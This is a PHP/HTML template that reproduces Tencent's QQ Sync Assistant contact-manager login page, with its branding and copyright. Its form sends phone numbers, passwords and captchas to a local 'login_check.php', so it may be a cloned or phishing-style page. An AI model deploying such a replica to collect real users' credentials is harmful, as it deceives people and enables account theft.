
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>QQ同步助手 云端管理中心--云通讯录管理中心</title>
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
	<meta http-equiv="Pragma" content="no-cache" />
	<meta name="keywords"
		content="QQ同步助手,通讯录,电话本,联系人,管理中心,短信,iPhone,Android,安卓,塞班,S60,同步,备份,网络备份,联系人去重,官网" />
	<meta name="description" content="QQ同步助手、腾讯手机管家、微信等通讯录备份的云端管理中心。在这里，能在网页上管理你备份的通讯录、联系人、短信。让你的云端通讯录、联系人、短信井井有条，尽在你掌握之中。" />
	<link style='text/css' rel='stylesheet' href='<?=base_url().'css/pre_login/request.css'?>'/>
</head>
<body>
<div class="header">
	<div class="logo-box">
		<h2>QQ同步助手</h2>
		<h1>通讯录管理中心</h1>
	</div>
	<div class="q-links">
		<a href="http://pim.qq.com/" target="_blank">官网</a> |
		<a href="http://txl.qq.com/" target="_blank">相关产品</a> |
		<a href="http://support.qq.com/write.shtml?fid=731" target="_blank">我要反馈</a>
	</div>
</div>
<div class="wrapper">
	<div class="content">
		<div class="msg-box"><img src="<?=base_url().'images/loginUI/3.png'?>" alt="" /><i></i></div>
		<div class="login-box">
			<div class="tab-bar">
				<a href="#" class="tab-tel" hidefocus>手机帐号</a>
			</div>

			<div id="telLogin" ><form action="login_check.php" method="post" id="telLoginForm">
					<ul class="tel-login">
						<li class="psw-error-tips"></li>
						<li><label>手机帐号：</label><input name="area" id="input_area" class="text" type="text"  value="+86" style="width: 50px" /> <input name="mobile" id="input_mobile" class="text" type="text" value="" style="width: 200px" /></li>
						<li><label>手机密码：</label><input name="password"  name="input_password" class="text" type="password" style="width: 268px" /></li>
						<li><label>验&nbsp; 证&nbsp;码：</label><input name="verify" id="input_verify" type="text" class="text" style="width: 268px" /></li>
						<li><label></label><a href="javascript:reloadCode();"><img src="<?php echo site_url('login/captcha');?>" id="real_image" alt="正在加载验证码" width="120" height="50" />看不清，换一张</a></li>
						<li><input type="submit" class="login-btn" id="login_button" value="登 录" /></li>
						<li class="last"><a href="http://service.qq.com/info/70899.html" target="_blank">如何获取手机帐号？</a></li>
					</ul>
				</form>
			</div>


			<div class="b-bar">立即下载<a href="http://pim.qq.com/down.jsp" target="_blank">手机客户端</a>，确保通讯录不丢失。</div>
		</div>
		<div class="qr-p"><img src="http://pim.qq.com/images2.0/qr-p.jpg" alt="" width="405" height="326" /></div>
	</div>
</div>
<div class="footer">
	<p class="c">Copyright © 1998 - 2013 Tencent. All Rights Reserved.</p>
	<p>腾讯公司   版权所有</p>
</div>
<div class="fuck-ie6">你的IE浏览器版本过低，为确保通讯录管理的安全和便捷，建议<a href="http://windows.microsoft.com/zh-CN/internet-explorer/download-ie" target="_blank" class="logClass" name="fuck_ie6">立即升级IE浏览器</a></div>
<script>var contextPath = '',serverName = 'pim.qq.com', schema = 'https', error='',isLogin = false;</script>
<script type='text/javascript' src='<?=base_url().'scripts/pre_login/request.js?request=js/jquery.js;js/jquery.md5.js;js/cookie.js;js/login.js&key=6537EB0F4236B5E482A7377E835D0EF9'?>'></script>

<script type="text/javascript">
/*验证码*/
	function reloadCode() {
		var dom = document.getElementById("real_image");
  		dom.src = "<?php echo site_url('login/captcha');?>?str=" + Math.random();
}
</script>
</body>
</html>

